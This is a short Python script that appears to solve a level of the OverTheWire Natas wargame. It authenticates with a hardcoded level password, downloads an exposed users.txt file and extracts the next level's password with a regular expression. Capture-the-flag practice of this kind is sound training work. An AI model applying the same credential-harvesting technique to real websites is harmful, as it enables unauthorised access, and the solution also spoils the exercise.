import requests
import re

# Authentication
username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

# URL to users.txt
url = f"http://{username}.natas.labs.overthewire.org/files/users.txt"

response = requests.get(url, auth=(username, password))
content = response.text

print(re.findall("natas3:(.*)", content)[0])